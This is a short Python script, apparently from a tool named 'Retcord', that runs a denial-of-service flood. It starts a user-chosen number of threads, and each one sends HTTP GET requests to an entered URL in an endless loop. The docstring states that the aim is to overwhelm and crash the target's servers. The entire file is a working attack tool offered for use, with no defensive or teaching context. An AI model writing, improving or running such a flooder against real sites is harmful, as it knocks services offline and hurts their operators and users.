import os
import requests
import threading
import time

"""
Constantly sends HTTP requests to the target, which may overwhelm their servers and crash them. This is a basic Denial of Service (DoS) attack. Use at your own risk.
"""

def main():
    
    os.system("title [Retcord] DoS attack")

    print("Close the terminal window to stop sending requests (CTRL + C doesn't work).\n")

    def dos(target):
        
        #Start sending HTTP requests to the target
        while True:
            try:
                request = requests.get(target)
                print(f"Request sent (status code: {request.status_code}).")
                
            except requests.exceptions.ConnectionError:
                print("Conection error")
        

    threads = 20
    url = input("Enter URL: ")

    #Get the amount of threads
    try:
        threads = int(input("Threads: "))
        
        if threads == 0:
            print("Invalid thread count.")
            time.sleep(1)
            exit()
            
    except ValueError:
            print("Invalid thread count.")
            time.sleep(1)
            exit()

    #Get the target's URL (IP addresses count as well)
    if not url.__contains__("http"):
        print("URL must contain http or https prefix")
        time.sleep(1)
        exit()

    if not url.__contains__("."):
        print("Invalid IP or domain")
        time.sleep(1)
        exit()

    #Start DoS-ing
    for i in range(0, threads):
        thread = threading.Thread(target=dos, args=(url,))
        thread.start()
        print(str(i + 1) + " threads started")

if __name__ == "__main__":
    main()